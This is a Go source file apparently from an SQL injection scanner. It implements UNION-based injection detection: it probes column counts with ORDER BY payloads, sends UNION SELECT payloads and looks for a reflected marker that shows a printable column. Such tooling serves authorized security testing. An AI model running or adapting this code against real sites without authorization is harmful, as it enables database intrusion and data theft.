package techniques

import (
	"bytes"
	"context"
	"fmt"
	"strings"

	"github.com/0xseif-code/vexor/internal/sqli/dbms"
)

// maxColumns caps the ORDER BY scan.
const maxColumns = 20

// Union finds the column count via ORDER BY, then reflects a UNION SELECT.
func (r *Runner) Union(ctx context.Context, psets []*dbms.Payloads) *Result {
	for _, p := range psets {
		orderTpls := p.Union.OrderBy
		if len(orderTpls) == 0 {
			continue
		}
		cols := r.findColumns(ctx, orderTpls[0], r.Point.Value)
		if cols <= 0 {
			continue
		}
		for _, tpl := range p.Union.UnionSelect {
			if ctx.Err() != nil {
				return nil
			}
			colsStr := buildCols(cols)
			payload := dbms.Expand(tpl, dbms.Macros{Orig: r.Point.Value, Cols: colsStr})
			s, ok := r.once(ctx, r.Point.Render(payload))
			if !ok {
				continue
			}
			// WORKING UNION: the unioned page matches the baseline layout.
			if s.sim >= 0.85 {
				if ev, ok2 := r.findPrintable(ctx, tpl, cols); ok2 {
					return &Result{
						Technique:  TechUnion,
						DB:         p.Name,
						Payload:    injectedWoMarker(tpl, r.Point.Value, cols, p.Name),
						Evidence:   "reflected column content: " + ev,
						Confidence: 90,
					}
				}
				return &Result{
					Technique:  TechUnion,
					DB:         p.Name,
					Payload:    payload,
					Evidence:   fmt.Sprintf("UNION accepted (%d columns), no printable column found", cols),
					Confidence: 60,
				}
			}
		}
	}
	return nil
}

// findColumns walks n = 1..20; the first n whose ORDER BY breaks the query
// gives columns = n-1.
func (r *Runner) findColumns(ctx context.Context, orderTpl, orig string) int {
	for n := 1; n <= maxColumns; n++ {
		if ctx.Err() != nil {
			return 0
		}
		payload := dbms.Expand(orderTpl, dbms.Macros{Orig: orig, N: n})
		s, ok := r.once(ctx, r.Point.Render(payload))
		if !ok {
			if n == 1 {
				return 0
			}
			return n - 1
		}
		if s.sim < 0.72 && !r.Cfg.Fast {
			// Confirmation pass to avoid mistaking a transient network blip
			// for a column-count boundary. Skipped in --fast mode.
			s2, ok2 := r.once(ctx, r.Point.Render(payload))
			if ok2 && s2.sim < 0.72 {
				return n - 1
			}
			continue
		}
		if s.sim < 0.72 {
			return n - 1
		}
	}
	return 0
}

// findPrintable swaps a marker value into each positional column and looks for
// its reflection in the response.
func (r *Runner) findPrintable(ctx context.Context, unionTpl string, cols int) (string, bool) {
	for j := 0; j < cols; j++ {
		if ctx.Err() != nil {
			return "", false
		}
		payload := dbms.Expand(unionTpl, dbms.Macros{
			Orig: r.Point.Value,
			Cols: colsWithMarker(cols, j),
		})
		s, ok := r.once(ctx, r.Point.Render(payload))
		if !ok {
			continue
		}
		if idx := bytes.Index(s.body, []byte(dbms.Marker)); idx >= 0 {
			snippet := snippetAround(s.body, idx, 60)
			return fmt.Sprintf("column %d (%.40s)", j+1, snippet), true
		}
	}
	return "", false
}

func snippetAround(body []byte, idx, radius int) string {
	if idx < 0 {
		return ""
	}
	start := idx - radius
	if start < 0 {
		start = 0
	}
	end := idx + radius
	if end > len(body) {
		end = len(body)
	}
	return string(body[start:end])
}

func buildCols(n int) string {
	return strings.Repeat("NULL,", n-1) + "NULL"
}

func colsWithMarker(n, markerIdx int) string {
	cols := make([]string, n)
	for i := range cols {
		cols[i] = "NULL"
	}
	cols[markerIdx] = dbms.Marker
	return strings.Join(cols, ",")
}

// injectedWoMarker returns a display payload for the finding when reflection
// was confirmed (the marker is held in evidence separately).
func injectedWoMarker(tpl, orig string, cols int, db string) string {
	_ = db
	return dbms.Expand(tpl, dbms.Macros{Orig: orig, Cols: buildCols(cols)})
}
